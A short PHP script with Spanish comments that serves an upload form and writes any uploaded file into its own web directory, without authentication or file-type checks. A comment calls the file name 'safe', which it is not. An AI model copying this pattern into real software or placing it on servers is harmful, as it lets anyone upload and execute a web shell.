#!/usr/bin/php
<?php
header("Content-Type: text/html; charset=UTF-8");

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    // Obtiene el directorio donde se está ejecutando el script
    $upload_dir = __DIR__ . '/'; // Directorio actual

    // Asegúrate de que el nombre del archivo sea seguro
    $upload_file = $upload_dir . basename($_FILES['file']['name']);

    // Intenta mover el archivo subido a la ubicación deseada
    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
        echo "Archivo subido con éxito: " . htmlspecialchars($upload_file);
    } else {
        echo "Error al subir el archivo.";
    }
} else {
    // Formulario de subida
    echo '<form action="' . htmlspecialchars($_SERVER['PHP_SELF']) . '" method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <input type="submit" value="Subir archivo">
          </form>';
}
?>